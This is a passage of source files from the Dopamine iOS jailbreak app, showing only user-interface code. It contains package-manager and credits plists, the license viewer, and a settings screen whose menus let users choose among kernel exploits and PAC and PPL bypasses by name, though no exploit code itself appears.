        [picker.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor]
    ]];
}


@end

```

`Application/Dopamine/UI/PkgManagers/PkgManagers.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<array>
	<dict>
		<key>Display Name</key>
		<string>Sileo</string>
		<key>Key</key>
		<string>org.coolstar.SileoStore</string>
		<key>Icon</key>
		<string>Sileo</string>
		<key>Package</key>
		<string>sileo.deb</string>
	</dict>
	<dict>
		<key>Display Name</key>
		<string>Zebra</string>
		<key>Key</key>
		<string>xyz.willy.Zebra</string>
		<key>Icon</key>
		<string>Zebra</string>
		<key>Package</key>
		<string>zebra.deb</string>
	</dict>
</array>
</plist>

```

`Application/Dopamine/UI/Settings/Credits.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>items</key>
	<array>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>headerCellClass</key>
			<string>DOHeaderCell</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSStaticTextCell</string>
			<key>cellClass</key>
			<string>DOButtonCell</string>
			<key>title</key>
			<string>Credits_Button_Source_Code</string>
			<key>buttonHeight</key>
			<integer>44</integer>
			<key>key</key>
			<string>src</string>
			<key>image</key>
			<string>filemenu.and.cursorarrow</string>
			<key>action</key>
			<string>openSourceCode</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSStaticTextCell</string>
			<key>cellClass</key>
			<string>DOButtonCell</string>
			<key>title</key>
			<string>Credits_Button_Discord</string>
			<key>buttonHeight</key>
			<integer>44</integer>
			<key>key</key>
			<string>discord</string>
			<key>image</key>
			<string>bubble.left.and.bubble.right.fill</string>
			<key>action</key>
			<string>openDiscord</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSStaticTextCell</string>
			<key>cellClass</key>
			<string>DOButtonCell</string>
			<key>title</key>
			<string>Credits_Button_License</string>
			<key>buttonHeight</key>
			<integer>44</integer>
			<key>key</key>
			<string>license</string>
			<key>image</key>
			<string>newspaper</string>
			<key>action</key>
			<string>openLicense</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>Developers</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>headerCellClass</key>
			<string>DOCreditsCell</string>
			<key>names</key>
			<array>
				<dict>
					<key>name</key>
					<string>opa334</string>
					<key>link</key>
					<string>https://twitter.com/opa334dev</string>
				</dict>
				<dict>
					<key>name</key>
					<string>kok3shidoll</string>
					<key>link</key>
					<string>https://github.com/kok3shidoll</string>
				</dict>
			</array>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>UI and Design</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>headerCellClass</key>
			<string>DOCreditsCell</string>
			<key>names</key>
			<array>
				<dict>
					<key>name</key>
					<string>tomt000</string>
					<key>link</key>
					<string>https://twitter.com/tomt000</string>
				</dict>
				<dict>
					<key>name</key>
					<string>sourcelocation</string>
					<key>link</key>
					<string>https://twitter.com/sourceloc</string>
				</dict>
				<dict>
					<key>name</key>
					<string>xerus</string>
					<key>link</key>
					<string>https://twitter.com/xerusdesign</string>
				</dict>
			</array>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>Credits</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>headerCellClass</key>
			<string>DOCreditsCell</string>
			<key>names</key>
			<array>
				<dict>
					<key>name</key>
					<string>Fugu15</string>
					<key>link</key>
					<string>https://github.com/pinauten/Fugu15</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Fugu15_Rootful</string>
					<key>link</key>
					<string>https://github.com/pinauten/Fugu15_Rootful</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Linus Henze</string>
					<key>link</key>
					<string>https://twitter.com/LinusHenze</string>
				</dict>
				<dict>
					<key>name</key>
					<string>tihmstar</string>
					<key>link</key>
					<string>https://twitter.com/tihmstar</string>
				</dict>
				<dict>
					<key>name</key>
					<string>oct0xor</string>
					<key>link</key>
					<string>https://twitter.com/oct0xor</string>
				</dict>
				<dict>
					<key>name</key>
					<string>kucher1n</string>
					<key>link</key>
					<string>https://twitter.com/kucher1n</string>
				</dict>
				<dict>
					<key>name</key>
					<string>bzvr_</string>
					<key>link</key>
					<string>https://twitter.com/bzvr_</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Op. Triangulation</string>
					<key>link</key>
					<string>https://www.youtube.com/watch?v=1f6YyH62jFE</string>
				</dict>
				<dict>
					<key>name</key>
					<string>felix-pb</string>
					<key>link</key>
					<string>https://github.com/felix-pb</string>
				</dict>
				<dict>
					<key>name</key>
					<string>John Aakerblom</string>
					<key>link</key>
					<string>https://twitter.com/jaakerblom</string>
				</dict>
				<dict>
					<key>name</key>
					<string>potmdehex</string>
					<key>link</key>
					<string>https://github.com/potmdehex</string>
				</dict>
				<dict>
					<key>name</key>
					<string>_simo36</string>
					<key>link</key>
					<string>https://twitter.com/_simo36</string>
				</dict>
				<dict>
					<key>name</key>
					<string>0x7ff</string>
					<key>link</key>
					<string>https://github.com/0x7ff</string>
				</dict>
				<dict>
					<key>name</key>
					<string>évelyne</string>
					<key>link</key>
					<string>https://github.com/evelyneee</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Alfie</string>
					<key>link</key>
					<string>https://twitter.com/alfiecg_dev</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Clarity</string>
					<key>link</key>
					<string>https://github.com/TheRealClarity</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Dhinak G</string>
					<key>link</key>
					<string>https://twitter.com/dhinakg</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Capt Inc</string>
					<key>link</key>
					<string>https://github.com/captinc</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Nick Chan</string>
					<key>link</key>
					<string>https://github.com/asdfugil</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Sam Bingner</string>
					<key>link</key>
					<string>https://github.com/sbingner</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Procursus</string>
					<key>link</key>
					<string>https://procursus.social/@team</string>
				</dict>
				<dict>
					<key>name</key>
					<string>roothideDev</string>
					<key>link</key>
					<string>https://twitter.com/roothideDev</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Amy While</string>
					<key>link</key>
					<string>https://github.com/elihwyma</string>
				</dict>
				<dict>
					<key>name</key>
					<string>Adam Demasi</string>
					<key>link</key>
					<string>https://github.com/kirb</string>
				</dict>
			</array>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>footerText</key>
			<string></string>
		</dict>
	</array>
	<key>title</key>
	<string>Dopamine Settings</string>
</dict>
</plist>

```

`Application/Dopamine/UI/Settings/DOCreditsViewController.h`:

```h
//
//  DOCreditsViewController.h
//  Dopamine
//
//  Created by tomt000 on 08/01/2024.
//

#import <UIKit/UIKit.h>
#import <Preferences/PSListController.h>
#import <Preferences/PSSpecifier.h>
#import "DOPSListController.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOCreditsViewController : DOPSListController

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Settings/DOCreditsViewController.m`:

```m
//
//  DOCreditsViewController.m
//  Dopamine
//
//  Created by tomt000 on 08/01/2024.
//

#import "DOCreditsViewController.h"
#import "DOLicenseViewController.h"
#import "DOUIManager.h"
#import "DOEnvironmentManager.h"
#import <Preferences/PSSpecifier.h>

@interface DOCreditsViewController ()

@end

@implementation DOCreditsViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
}

- (id)specifiers
{
    if(_specifiers == nil) {
        _specifiers = [self loadSpecifiersFromPlistName:@"Credits" target:self];

        PSSpecifier *headerSpecifier = _specifiers[0];
        [headerSpecifier setProperty:[NSString stringWithFormat:@"Dopamine %@ - %@", [DOEnvironmentManager sharedManager].appVersionDisplayString, DOLocalizedString(@"Menu_Credits_Title")] forKey:@"title"];
    }
    return _specifiers;
}

- (void)openSourceCode
{
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"https://github.com/opa334/Dopamine"] options:@{} completionHandler:nil];
}

- (void)openDiscord
{
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"https://discord.gg/jb"] options:@{} completionHandler:nil];
}

- (void)openLicense
{
    [self.navigationController pushViewController:[[DOLicenseViewController alloc] init] animated:YES];
}

@end

```

`Application/Dopamine/UI/Settings/DOLicenseViewController.h`:

```h
//
//  DOLicenseViewController.h
//  Dopamine
//
//  Created by tomt000 on 13/02/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOLicenseViewController : UIViewController

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Settings/DOLicenseViewController.m`:

```m
//
//  DOLicenseViewController.m
//  Dopamine
//
//  Created by tomt000 on 13/02/2024.
//

#import "DOLicenseViewController.h"
#import "DOPSListController.h"
#import "DOPSListItemsController.h"
#import "DOUIManager.h"

@interface DOLicenseViewController ()

@property (nonatomic, strong) UITextView *license;
@property (nonatomic, strong) UIScrollView *scrollView;
@property (nonatomic, assign) int selectedLicense;

@property (nonatomic, strong) UIImpactFeedbackGenerator *impactGenerator;

@end

@implementation DOLicenseViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
    [DOPSListController setupViewControllerStyle:self];

    UIView *header = [DOPSListItemsController makeHeader:DOLocalizedString(@"Credits_Button_License") withTarget:self];
    header.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:header];

    [NSLayoutConstraint activateConstraints:@[
        [header.topAnchor constraintEqualToAnchor:self.view.topAnchor constant:5],
        [header.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [header.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [header.heightAnchor constraintEqualToConstant:70]
    ]]; 
    
    self.scrollView = [[UIScrollView alloc] init];
    self.scrollView.showsHorizontalScrollIndicator = NO;
    self.scrollView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.scrollView];

    [NSLayoutConstraint activateConstraints:@[
        [self.scrollView.topAnchor constraintEqualToAnchor:header.bottomAnchor],
        [self.scrollView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:25],
        [self.scrollView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.scrollView.heightAnchor constraintEqualToConstant:30]
    ]];

    [self setupLicenseButtons];
    
    self.license = [[UITextView alloc] init];
    self.license.translatesAutoresizingMaskIntoConstraints = NO;

    [self.view addSubview:self.license];

    [NSLayoutConstraint activateConstraints:@[
        [self.license.topAnchor constraintEqualToAnchor:self.scrollView.bottomAnchor constant:10],
        [self.license.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:20],
        [self.license.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-20],
        [self.license.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor constant:0]
    ]];

    self.license.editable = NO;
    self.license.font = [UIFont systemFontOfSize:14];
    self.license.textColor = [UIColor whiteColor];
    self.license.backgroundColor = [UIColor clearColor];
    self.selectedLicense = 0;

    self.impactGenerator = [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleLight];
}

+ (NSArray*)licenses
{
    return @[
        @{
            @"name": @"Dopamine",
            @"file": @"LICENSE"
        },
        @{
            @"name": @"kfd",
            @"file": @"LICENSE_kfd"
        },
        @{
            @"name": @"weightBufs",
            @"file": @"LICENSE_weightBufs"
        },
        @{
            @"name": @"libgrabkernel2",
            @"file": @"LICENSE_libgrabkernel2"
        },
        @{
            @"name": @"ElleKit",
            @"file": @"LICENSE_ElleKit"
        },
        @{
            @"name": @"Fugu15",
            @"file": @"LICENSE_Fugu15"
        },
        @{
            @"name": @"Fugu15_Rootful",
            @"file": @"LICENSE_Fugu15_Rootful"
        },
        @{
            @"name": @"libc",
            @"file": @"LICENSE_libc"
        },
        @{
            @"name": @"ChOma",
            @"file": @"LICENSE_ChOma"
        },
        @{
            @"name": @"XPF",
            @"file": @"LICENSE_XPF"
        },
        @{
            @"name": @"opainject",
            @"file": @"LICENSE_opainject"
        },
        @{
            @"name": @"plooshinit",
            @"file": @"LICENSE_plooshinit"
        },
        @{
            @"name": @"dimentio",
            @"file": @"LICENSE_dimentio"
        },
        @{
            @"name": @"Procursus",
            @"file": @"LICENSE_Procursus"
        },
        @{
            @"name": @"Sileo",
            @"file": @"LICENSE_Sileo"
        },
        @{
            @"name": @"Zebra",
            @"file": @"LICENSE_Zebra"
        },
    ];
}

- (void)setupLicenseButtons
{
    NSArray *licenses = [DOLicenseViewController licenses];

    NSLayoutAnchor *lastAnchor = self.scrollView.leadingAnchor;
    for (NSDictionary *license in licenses)
    {
        UIButton *button = [UIButton buttonWithType:UIButtonTypeSystem];
        [button setTitle:license[@"name"] forState:UIControlStateNormal];
        [button setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
        button.titleLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
        button.backgroundColor = [UIColor whiteColor];
        button.layer.cornerRadius = 8;
        button.layer.cornerCurve = kCACornerCurveContinuous;
        button.translatesAutoresizingMaskIntoConstraints = NO;
        [button addTarget:self action:@selector(licenseButtonTapped:) forControlEvents:UIControlEventTouchUpInside];

        [self.scrollView addSubview:button];

        NSString *buttonTitle = license[@"name"];
        CGSize textSize = [buttonTitle sizeWithAttributes:@{NSFontAttributeName: button.titleLabel.font}];
        CGFloat buttonWidth = textSize.width + 20;
        
        BOOL isFirst = self.scrollView.leadingAnchor == lastAnchor;

        [NSLayoutConstraint activateConstraints: @[
            [button.centerYAnchor constraintEqualToAnchor:self.scrollView.centerYAnchor],
            [button.heightAnchor constraintEqualToConstant:30],
            [button.widthAnchor constraintEqualToConstant:buttonWidth],
            [button.leadingAnchor constraintEqualToAnchor:lastAnchor constant:isFirst ? 0 : 5]
        ]];
        
        lastAnchor = button.trailingAnchor;
    }

    [lastAnchor constraintEqualToAnchor:self.scrollView.trailingAnchor constant:-25].active = YES;
}

- (void)licenseButtonTapped:(UIButton *)sender
{
    NSInteger index = [self.scrollView.subviews indexOfObject:sender];
    self.selectedLicense = (int)index;
    [self.impactGenerator impactOccurred];
}


- (void)setSelectedLicense:(int)selectedLicense
{
    _selectedLicense = selectedLicense;
    self.license.text = [NSString stringWithContentsOfFile:[[NSBundle mainBundle] pathForResource:[DOLicenseViewController licenses][_selectedLicense][@"file"] ofType:@"md"] encoding:NSUTF8StringEncoding error:nil];
    [self.scrollView.subviews enumerateObjectsUsingBlock:^(UIView *view, NSUInteger idx, BOOL *stop) {
        [view setAlpha:0.2];
    }];
    [[self.scrollView.subviews objectAtIndex:_selectedLicense] setAlpha:1.0];
}

- (void)dismiss
{
    [self.navigationController popViewControllerAnimated:YES];
}

@end

```

`Application/Dopamine/UI/Settings/DOSettingsController.h`:

```h
//
//  DOSettingsController.h
//  Dopamine
//
//  Created by tomt000 on 08/01/2024.
//

#import <UIKit/UIKit.h>
#import <LocalAuthentication/LocalAuthentication.h>
#import <Preferences/PSListController.h>
#import <Preferences/PSSpecifier.h>
#import "DOPSListController.h"
#import "DOExploit.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOSettingsController : DOPSListController <UIImagePickerControllerDelegate>
{
    NSArray <DOExploit *>*_availableKernelExploits;
    NSArray <DOExploit *>*_availablePACBypasses;
    NSArray <DOExploit *>*_availablePPLBypasses;
    NSString *_lastKnownTheme;

    PSSpecifier *_customBootlogoEnabledSpecifier;
    PSSpecifier *_customBootlogoSpecifier;
}

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Settings/DOSettingsController.m`:

```m
//
//  DOSettingsController.m
//  Dopamine
//
//  Created by tomt000 on 08/01/2024.
//

#import "DOSettingsController.h"
#import <objc/runtime.h>
#import <Photos/Photos.h>
#import <libjailbreak/util.h>
#import "DOUIManager.h"
#import "DOPkgManagerPickerViewController.h"
#import "DOHeaderCell.h"
#import "DOEnvironmentManager.h"
#import "DOExploitManager.h"
#import "DOPSListItemsController.h"
#import "DOPSExploitListItemsController.h"
#import "DOThemeManager.h"
#import "DOSceneDelegate.h"
#import "DOPSJetsamListItemsController.h"
#import "DOButtonCell.h"

@interface DOSettingsController ()

@end

@implementation DOSettingsController

- (void)viewDidLoad
{
    _lastKnownTheme = [[DOThemeManager sharedInstance] enabledTheme].key;
    [super viewDidLoad];
}

- (void)viewWillAppear:(BOOL)arg1
{
    [super viewWillAppear:arg1];
    if (_lastKnownTheme != [[DOThemeManager sharedInstance] enabledTheme].key)
    {
        [DOSceneDelegate relaunch];
        NSString *icon = [[DOThemeManager sharedInstance] enabledTheme].icon;
        [[UIApplication sharedApplication] setAlternateIconName:icon completionHandler:^(NSError * _Nullable error) {
            if (error)
                NSLog(@"Error changing app icon: %@", error);
        }];

        if ([DOEnvironmentManager sharedManager].isJailbroken) {
            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                [[DOEnvironmentManager sharedManager] updateBootLogo];
            });
        }
    }
}

- (NSArray *)availableKernelExploitIdentifiers
{
    NSMutableArray *identifiers = [NSMutableArray new];
    for (DOExploit *exploit in _availableKernelExploits) {
        [identifiers addObject:exploit.identifier];
    }
    return identifiers;
}

- (NSArray *)availableKernelExploitNames
{
    NSMutableArray *names = [NSMutableArray new];
    for (DOExploit *exploit in _availableKernelExploits) {
        [names addObject:exploit.name];
    }
    return names;
}

- (NSArray *)availablePACBypassIdentifiers
{
    NSMutableArray *identifiers = [NSMutableArray new];
    if (![DOEnvironmentManager sharedManager].isPACBypassRequired) {
        [identifiers addObject:@"none"];
    }
    for (DOExploit *exploit in _availablePACBypasses) {
        [identifiers addObject:exploit.identifier];
    }
    return identifiers;
}

- (NSArray *)availablePACBypassNames
{
    NSMutableArray *names = [NSMutableArray new];
    if (![DOEnvironmentManager sharedManager].isPACBypassRequired) {
        [names addObject:DOLocalizedString(@"None")];
    }
    for (DOExploit *exploit in _availablePACBypasses) {
        [names addObject:exploit.name];
    }
    return names;
}

- (NSArray *)availablePPLBypassIdentifiers
{
    NSMutableArray *identifiers = [NSMutableArray new];
    for (DOExploit *exploit in _availablePPLBypasses) {
        [identifiers addObject:exploit.identifier];
    }
    return identifiers;
}

- (NSArray *)availablePPLBypassNames
{
    NSMutableArray *names = [NSMutableArray new];
    for (DOExploit *exploit in _availablePPLBypasses) {
        [names addObject:exploit.name];
    }
    return names;
}

- (NSArray *)themeIdentifiers
{
    return [[DOThemeManager sharedInstance] getAvailableThemeKeys];
}

- (NSArray *)themeNames
{
    return [[DOThemeManager sharedInstance] getAvailableThemeNames];
}

- (NSArray *)jetsamOptionNumbers
{
    return @[
    @2,
    @3,
    @4,
    @5,
    @6,
    @7,
    @8,
    ];
}

- (NSArray *)jetsamOptionTitles
{
    return @[
        @"1x",
        @"1.5x",
        @"2x",
        @"2.5x",
        [NSString stringWithFormat:@"3x (%@)", DOLocalizedString(@"Recommended")],
        @"3.5x",
        @"4x",
    ];
}

- (id)specifiers
{
    if(_specifiers == nil) {
        NSMutableArray *specifiers = [NSMutableArray new];
        DOEnvironmentManager *envManager = [DOEnvironmentManager sharedManager];
        DOExploitManager *exploitManager = [DOExploitManager sharedManager];

        NSNumber *buttonHeight = @(44);
        
        SEL defGetter = @selector(readPreferenceValue:);
        SEL defSetter = @selector(setPreferenceValue:specifier:);
        
        NSSortDescriptor *prioritySortDescriptor = [NSSortDescriptor sortDescriptorWithKey:@"priority" ascending:NO];
        
        _availableKernelExploits = [[exploitManager availableExploitsForType:EXPLOIT_TYPE_KERNEL] sortedArrayUsingDescriptors:@[prioritySortDescriptor]];
        if (envManager.isArm64e) {
            _availablePACBypasses = [[exploitManager availableExploitsForType:EXPLOIT_TYPE_PAC] sortedArrayUsingDescriptors:@[prioritySortDescriptor]];
            _availablePPLBypasses = [[exploitManager availableExploitsForType:EXPLOIT_TYPE_PPL] sortedArrayUsingDescriptors:@[prioritySortDescriptor]];
        }
        
        PSSpecifier *headerSpecifier = [PSSpecifier emptyGroupSpecifier];
        [headerSpecifier setProperty:@"DOHeaderCell" forKey:@"headerCellClass"];
        [headerSpecifier setProperty:[NSString stringWithFormat:@"Settings"] forKey:@"title"];
        [specifiers addObject:headerSpecifier];
        
        if (envManager.isSupported) {
            if (!envManager.isJailbroken) {
                PSSpecifier *exploitGroupSpecifier = [PSSpecifier emptyGroupSpecifier];
                exploitGroupSpecifier.name = DOLocalizedString(@"Section_Exploits");
                [specifiers addObject:exploitGroupSpecifier];
                
                PSSpecifier *kernelExploitSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Kernel Exploit") target:self set:defSetter get:defGetter detail:nil cell:PSLinkListCell edit:nil];
                [kernelExploitSpecifier setProperty:@YES forKey:@"enabled"];
                [kernelExploitSpecifier setProperty:exploitManager.preferredKernelExploit.identifier forKey:@"default"];
                kernelExploitSpecifier.detailControllerClass = [DOPSExploitListItemsController class];
                [kernelExploitSpecifier setProperty:@"availableKernelExploitIdentifiers" forKey:@"valuesDataSource"];
                [kernelExploitSpecifier setProperty:@"availableKernelExploitNames" forKey:@"titlesDataSource"];
                [kernelExploitSpecifier setProperty:@"selectedKernelExploit" forKey:@"key"];
                [kernelExploitSpecifier setProperty:(_availableKernelExploits.firstObject.identifier ?: @"none") forKey:@"recommendedExploitIdentifier"];
                [specifiers addObject:kernelExploitSpecifier];
                
                if (envManager.isArm64e) {
                    PSSpecifier *pacBypassSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"PAC Bypass") target:self set:defSetter get:defGetter detail:nil cell:PSLinkListCell edit:nil];
                    [pacBypassSpecifier setProperty:@YES forKey:@"enabled"];
                    DOExploit *preferredPACBypass = exploitManager.preferredPACBypass;
                    if (!preferredPACBypass) {
                        [pacBypassSpecifier setProperty:@"none" forKey:@"default"];
                    }
                    else {
                        [pacBypassSpecifier setProperty:preferredPACBypass.identifier forKey:@"default"];
                    }
                    pacBypassSpecifier.detailControllerClass = [DOPSExploitListItemsController class];
                    [pacBypassSpecifier setProperty:@"availablePACBypassIdentifiers" forKey:@"valuesDataSource"];
                    [pacBypassSpecifier setProperty:@"availablePACBypassNames" forKey:@"titlesDataSource"];
                    [pacBypassSpecifier setProperty:@"selectedPACBypass" forKey:@"key"];
                    [pacBypassSpecifier setProperty:([envManager isPACBypassRequired] ? _availablePACBypasses.firstObject.identifier : @"none") forKey:@"recommendedExploitIdentifier"];
                    [specifiers addObject:pacBypassSpecifier];
                    
                    PSSpecifier *pplBypassSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"PPL Bypass") target:self set:defSetter get:defGetter detail:nil cell:PSLinkListCell edit:nil];
                    [pplBypassSpecifier setProperty:@YES forKey:@"enabled"];
                    [pplBypassSpecifier setProperty:exploitManager.preferredPPLBypass.identifier forKey:@"default"];
                    pplBypassSpecifier.detailControllerClass = [DOPSExploitListItemsController class];
                    [pplBypassSpecifier setProperty:@"availablePPLBypassIdentifiers" forKey:@"valuesDataSource"];
                    [pplBypassSpecifier setProperty:@"availablePPLBypassNames" forKey:@"titlesDataSource"];
                    [pplBypassSpecifier setProperty:@"selectedPPLBypass" forKey:@"key"];
                    [pplBypassSpecifier setProperty:(_availablePPLBypasses.firstObject.identifier ?: @"none") forKey:@"recommendedExploitIdentifier"];
                    [specifiers addObject:pplBypassSpecifier];
                }
            }
            
            PSSpecifier *settingsGroupSpecifier = [PSSpecifier emptyGroupSpecifier];
            settingsGroupSpecifier.name = DOLocalizedString(@"Section_Jailbreak_Settings");
            [specifiers addObject:settingsGroupSpecifier];
            
            PSSpecifier *tweakInjectionSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Settings_Tweak_Injection") target:self set:@selector(setTweakInjectionEnabled:specifier:) get:@selector(readTweakInjectionEnabled:) detail:nil cell:PSSwitchCell edit:nil];
            [tweakInjectionSpecifier setProperty:@YES forKey:@"enabled"];
            [tweakInjectionSpecifier setProperty:@"tweakInjectionEnabled" forKey:@"key"];
            [tweakInjectionSpecifier setProperty:@YES forKey:@"default"];
            [specifiers addObject:tweakInjectionSpecifier];
            
            if (!envManager.isJailbroken) {
                PSSpecifier *verboseLogSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Settings_Verbose_Logs") target:self set:defSetter get:defGetter detail:nil cell:PSSwitchCell edit:nil];
                [verboseLogSpecifier setProperty:@YES forKey:@"enabled"];
                [verboseLogSpecifier setProperty:@"verboseLogsEnabled" forKey:@"key"];
                [verboseLogSpecifier setProperty:@NO forKey:@"default"];
                [specifiers addObject:verboseLogSpecifier];
            }
            
            PSSpecifier *idownloadSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Settings_iDownload") target:self set:@selector(setIDownloadEnabled:specifier:) get:@selector(readIDownloadEnabled:) detail:nil cell:PSSwitchCell edit:nil];
            [idownloadSpecifier setProperty:@YES forKey:@"enabled"];
            [idownloadSpecifier setProperty:@"idownloadEnabled" forKey:@"key"];
            [idownloadSpecifier setProperty:@NO forKey:@"default"];
            [specifiers addObject:idownloadSpecifier];
            
            PSSpecifier *appJitSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Settings_Apps_JIT") target:self set:@selector(setAppJITEnabled:specifier:) get:@selector(readAppJITEnabled:) detail:nil cell:PSSwitchCell edit:nil];
            [appJitSpecifier setProperty:@YES forKey:@"enabled"];
            [appJitSpecifier setProperty:@"appJITEnabled" forKey:@"key"];
            [appJitSpecifier setProperty:@YES forKey:@"default"];
            [specifiers addObject:appJitSpecifier];
            
            PSSpecifier *jetsamSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Settings_Jetsam_Multiplier") target:self set:@selector(setJetsamMultiplier:specifier:) get:@selector(readJetsamMultiplier:) detail:nil cell:PSLinkListCell edit:nil];
            [jetsamSpecifier setProperty:@YES forKey:@"enabled"];
            [jetsamSpecifier setProperty:@"jetsamMultiplier" forKey:@"key"];
            [jetsamSpecifier setProperty:@6 forKey:@"default"];
            jetsamSpecifier.detailControllerClass = [DOPSJetsamListItemsController class];
            [jetsamSpecifier setProperty:@"jetsamOptionNumbers" forKey:@"valuesDataSource"];
            [jetsamSpecifier setProperty:@"jetsamOptionTitles" forKey:@"titlesDataSource"];
            [specifiers addObject:jetsamSpecifier];
            
            if (!envManager.isJailbroken && !envManager.isInstalledThroughTrollStore) {
                PSSpecifier *removeJailbreakSwitchSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Button_Remove_Jailbreak") target:self set:@selector(setRemoveJailbreakEnabled:specifier:) get:defGetter detail:nil cell:PSSwitchCell edit:nil];
                [removeJailbreakSwitchSpecifier setProperty:@YES forKey:@"enabled"];
                [removeJailbreakSwitchSpecifier setProperty:@"removeJailbreakEnabled" forKey:@"key"];
                [specifiers addObject:removeJailbreakSwitchSpecifier];
            }
            
            if (envManager.isJailbroken || (envManager.isInstalledThroughTrollStore && envManager.isBootstrapped)) {
                PSSpecifier *actionsGroupSpecifier = [PSSpecifier emptyGroupSpecifier];
                actionsGroupSpecifier.name = DOLocalizedString(@"Section_Actions");
                [specifiers addObject:actionsGroupSpecifier];
                
                if (envManager.isJailbroken) {
                    PSSpecifier *refreshAppsSpecifier = [PSSpecifier preferenceSpecifierNamed:@"" target:self set:defSetter get:defGetter detail:nil cell:PSStaticTextCell edit:nil];
                    [refreshAppsSpecifier setProperty:@"Button_Refresh_Jailbreak_Apps" forKey:@"title"];
                    [refreshAppsSpecifier setProperty:[DOButtonCell class] forKey:@"cellClass"];
                    [refreshAppsSpecifier setProperty:buttonHeight forKey:@"height"];
                    [refreshAppsSpecifier setProperty:@"arrow.triangle.2.circlepath" forKey:@"image"];
                    [refreshAppsSpecifier setProperty:@"refreshJailbreakAppsPressed" forKey:@"action"];
                    [specifiers addObject:refreshAppsSpecifier];
                    
                    PSSpecifier *changeMobilePasswordSpecifier = [PSSpecifier preferenceSpecifierNamed:@"" target:self set:defSetter get:defGetter detail:nil cell:PSStaticTextCell edit:nil];
                    [changeMobilePasswordSpecifier setProperty:@"Button_Change_Mobile_Password" forKey:@"title"];
                    [changeMobilePasswordSpecifier setProperty:[DOButtonCell class] forKey:@"cellClass"];
                    [changeMobilePasswordSpecifier setProperty:buttonHeight forKey:@"height"];
                    [changeMobilePasswordSpecifier setProperty:@"key" forKey:@"image"];
                    [changeMobilePasswordSpecifier setProperty:@"changeMobilePasswordWithAuthenticationPressed" forKey:@"action"];
                    [specifiers addObject:changeMobilePasswordSpecifier];
                    
                    PSSpecifier *reinstallPackageManagersSpecifier = [PSSpecifier preferenceSpecifierNamed:@"" target:self set:defSetter get:defGetter detail:nil cell:PSStaticTextCell edit:nil];
                    [reinstallPackageManagersSpecifier setProperty:@"Button_Reinstall_Package_Managers" forKey:@"title"];
                    [reinstallPackageManagersSpecifier setProperty:[DOButtonCell class] forKey:@"cellClass"];
                    [reinstallPackageManagersSpecifier setProperty:buttonHeight forKey:@"height"];
                    if (@available(iOS 16.0, *))
                        [reinstallPackageManagersSpecifier setProperty:@"shippingbox.and.arrow.backward" forKey:@"image"];
                    else
                        [reinstallPackageManagersSpecifier setProperty:@"shippingbox" forKey:@"image"];
